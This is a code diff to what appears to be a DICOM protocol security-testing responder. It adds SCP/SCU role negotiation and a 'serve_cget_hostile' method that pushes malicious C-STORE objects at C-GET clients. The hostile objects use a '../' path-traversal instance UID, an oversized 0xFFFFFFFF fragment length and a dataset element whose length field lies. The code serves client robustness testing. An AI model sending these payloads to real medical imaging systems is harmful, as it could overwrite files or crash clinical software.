@@ -31,6 +31,7 @@ from .scapy_dicom import (
     DICOMMaximumLength, DICOMImplementationClassUID,
     DICOMImplementationVersionName, DICOMUserIdentity, DICOMUserIdentityResponse,
     DICOMPresentationContextAC, DICOMAbstractSyntax, DICOMTransferSyntax,
+    DICOMSCPSCURoleSelection,
     C_ECHO_RSP, C_STORE_RQ, C_STORE_RSP, C_FIND_RSP, C_MOVE_RSP, C_GET_RSP,
     parse_dimse_command_us, parse_dimse_status,
     _uid_to_bytes,
@@ -123,6 +124,29 @@ def parse_proposed_contexts(rq_bytes):
     return out
 
 
+def parse_proposed_roles(rq_bytes):
+    # type: (bytes) -> Dict[str, Any]
+    """Map ``sop_class_uid -> (scu_role, scp_role)`` from the Type 0x54 SCP/SCU
+    Role Selection sub-items an A-ASSOCIATE-RQ carried inside its User
+    Information item (PS3.7 D.3.3.4), so a responder can decide which roles to
+    echo back in the AC."""
+    out = {}  # type: Dict[str, Any]
+    rq = _parse_rq(rq_bytes)
+    if rq is None:
+        return out
+    for item in rq.variable_items:
+        if item.item_type != 0x50 or not item.haslayer(DICOMUserInformation):
+            continue
+        for sub in item[DICOMUserInformation].sub_items:
+            if sub.item_type == 0x54 and sub.haslayer(DICOMSCPSCURoleSelection):
+                role = sub[DICOMSCPSCURoleSelection]
+                uid = role.sop_class_uid
+                if isinstance(uid, bytes):
+                    uid = uid.rstrip(b"\x00").decode("ascii", "replace")
+                out[uid] = (int(role.scu_role), int(role.scp_role))
+    return out
+
+
 def parse_user_identity(rq_bytes):
     # type: (bytes) -> Optional[Dict[str, Any]]
     """Extract the Type 0x58 User Identity sub-item from an A-ASSOCIATE-RQ.
@@ -152,16 +176,26 @@ def accept_association(rq_bytes,
                        responding_ae=None,
                        implementation_version_name=None,
                        user_identity_response=None,
-                       transfer_syntax=None):
-    # type: (bytes, Optional[str], Optional[Any], Optional[bytes], Optional[str]) -> bytes
+                       transfer_syntax=None,
+                       *,
+                       role_response=None,
+                       echo_proposed_roles=False):
+    # type: (bytes, Optional[str], Optional[Any], Optional[bytes], Optional[str], Optional[Dict[str, Any]], bool) -> bytes
     """Build a conformant A-ASSOCIATE-AC for the given RQ.
 
     Accepts every proposed presentation context (result 0) and selects a
     transfer syntax (``transfer_syntax`` if proposed, else the first proposed,
     else Implicit VR LE). ``implementation_version_name`` and
     ``user_identity_response`` inject the SCP-side payloads the W1/W2 responders
-    care about. Returns raw AC bytes; falls back to a minimal AC if the RQ
-    can't be parsed."""
+    care about.
+
+    ``echo_proposed_roles`` echoes back every Type 0x54 SCP/SCU Role Selection
+    item the RQ proposed (granting the requestor's storage SCP role — the
+    strict-GRANT path for C-GET). ``role_response`` (``{sop_class_uid:
+    (scu_role, scp_role)}``) overrides what is returned per SOP class, so a test
+    can withhold a role by returning ``scp_role=0`` (the strict-WITHHOLD path).
+    Returns raw AC bytes; falls back to a minimal AC if the RQ can't be
+    parsed."""
     rq = _parse_rq(rq_bytes)
 
     ctx_items = []  # type: List[Any]
@@ -196,6 +230,22 @@ def accept_association(rq_bytes,
             resp = resp.encode("utf-8")
         user_sub.append(
             DICOMVariableItem() / DICOMUserIdentityResponse(server_response=resp))
+
+    # Type 0x54 SCP/SCU Role Selection echo: start from the proposed roles (if
+    # echoing), then let an explicit role_response override per SOP class.
+    roles_out = {}  # type: Dict[str, Any]
+    if echo_proposed_roles:
+        roles_out.update(parse_proposed_roles(rq_bytes))
+    if role_response:
+        roles_out.update(role_response)
+    for uid, role_pair in roles_out.items():
+        scu_role, scp_role = role_pair
+        user_sub.append(
+            DICOMVariableItem() / DICOMSCPSCURoleSelection(
+                sop_class_uid=_uid_to_bytes(uid),
+                scu_role=int(scu_role),
+                scp_role=int(scp_role),
+            ))
 
     variable_items = [DICOMVariableItem() / DICOMApplicationContext()]
     variable_items.extend(ctx_items)
@@ -349,7 +399,8 @@ class WorkflowResponder:
 
     def __init__(self, host="0.0.0.0", port=11112, ae_title="C_SCARE",
                  implementation_version_name=None, user_identity_response=None,
-                 transfer_syntax=None, known_aets=None, require_identity=None):
+                 transfer_syntax=None, known_aets=None, require_identity=None,
+                 role_response=None, echo_roles=False):
         # ``known_aets`` (W1): {called_ae: {"implementation_version_name":...,
         #   "user_identity_response":...}}. If set, an AET not in the map is
         #   rejected with called-AE-title-not-recognized (1/1/7).
@@ -361,6 +412,11 @@ class WorkflowResponder:
         self.transfer_syntax = transfer_syntax
         self.known_aets = known_aets
         self.require_identity = require_identity
+        # SCP/SCU role negotiation (W4 C-GET strict-peer): ``echo_roles`` grants
+        # back every proposed 0x54 role; ``role_response`` ({sop: (scu, scp)})
+        # overrides per SOP class so a withholding peer can be simulated.
+        self.role_response = role_response
+        self.echo_roles = echo_roles
         self._dimse_handlers = {}  # type: Dict[int, Callable]
         self._subop_id = 0
         self._wire()
@@ -432,6 +488,8 @@ class WorkflowResponder:
                 implementation_version_name=impl_ver,
                 user_identity_response=uid_resp,
                 transfer_syntax=self.transfer_syntax,
+                role_response=self.role_response,
+                echo_proposed_roles=self.echo_roles,
             )
 
         @scp.on_release_rq
@@ -536,6 +594,76 @@ class WorkflowResponder:
                 failed += 1
         conn.send(build_cget_rsp(ctx_id, msg_id, STATUS_SUCCESS,
                                  completed=completed, failed=failed))
+
+    def serve_cget_hostile(self, conn, ctx_id, command_bytes, mode="malformed"):
+        """Push a *malicious* C-STORE sub-operation at a C-GET SCU, then send the
+        final C-GET-RSP. The system under test here is the CLIENT.
+
+        ``mode``:
+          * ``path-traversal`` — Affected SOP Instance UID is a ``../`` escape
+            (CVE-2022-2119/2120 class): a client that derives a filename from it
+            may write outside its storage root.
+          * ``oversized`` — an encapsulated pixel-data fragment whose length
+            field claims 0xFFFFFFFF, to probe a client that trusts it.
+          * ``malformed`` — a dataset element with a lying (oversized) length,
+            via :class:`~c_scare.corruptor.Corruptor`.
+
+        Call from an ``on_c_get`` handler and return ``None``."""
+        msg_id = parse_dimse_command_us(command_bytes, 0x0000, 0x0110) or 1
+        sop_class, sop_inst, ds_bytes = self._hostile_store_object(mode)
+        store_ctx = self._storage_ctx_id(conn, sop_class, ctx_id)
+        rq = C_STORE_RQ(
+            affected_sop_class_uid=sop_class,
+            affected_sop_instance_uid=sop_inst,
+            message_id=self._next_subop_id())
+        completed = failed = 0
+        try:
+            conn.send(_pdata(store_ctx, bytes(rq), ds_bytes))
+            if self._read_status(conn) == STATUS_SUCCESS:
+                completed += 1
+            else:
+                failed += 1
+        except Exception:
+            failed += 1
+        conn.send(build_cget_rsp(ctx_id, msg_id, STATUS_SUCCESS,
+                                 completed=completed, failed=failed))
+
+    @staticmethod
+    def _hostile_store_object(mode):
+        # type: (str) -> Any
+        """Return ``(sop_class_uid, sop_instance_uid, dataset_bytes)`` for a
+        hostile C-STORE sub-operation. Lazy imports keep the attack catalog and
+        pixel/corruptor modules off the responder import path."""
+        sop_class = CT_IMAGE_STORAGE_SOP_CLASS_UID
+        if mode == "path-traversal":
+            from .attacks import PathTraversalAttacks
+            atk = PathTraversalAttacks.sop_instance_uid_traversal("posix")
+            return (atk.metadata.get("sop_class_uid", sop_class),
+                    atk.metadata.get("sop_instance_uid", "../../../../tmp/c-scare"),
+                    atk.payload)
+        if mode == "oversized":
+            from .pixel import EncapsulatedPixelData
+            from .element import Dataset, Element
+            epd = EncapsulatedPixelData()
+            epd.add_fragment(b"\x00" * 16, length_override=0xFFFFFFFF)
+            ds = Dataset()
+            ds / Element(0x0008, 0x0016, "UI", sop_class)
+            ds / Element(0x0008, 0x0018, "UI", "1.2.3.4.5")
+            ds / Element(0x7FE0, 0x0010, "OB", epd.encode())
+            return sop_class, "1.2.3.4.5", ds.encode()
+        # malformed (default): a real dataset whose element lies about its length
+        from .corruptor import Corruptor
+        from .element import Dataset, Element
+        base = Dataset()
+        base / Element(0x0008, 0x0016, "UI", sop_class)
+        base / Element(0x0008, 0x0018, "UI", "1.2.3.4.5")
+        base / Element(0x0010, 0x0010, "PN", "Hostile^Object")
+        try:
+            c = Corruptor(base.encode())
+            c.set_length(0x00100010, 0xFFFFFFFF)
+            return sop_class, "1.2.3.4.5", c.encode()
+        except Exception:
+            return sop_class, "1.2.3.4.5", base.encode()
 
     def _dispatch(self, conn, ctx_id, cmd, data):
         command_field = parse_dimse_command_us(cmd, 0x0000, 0x0100)
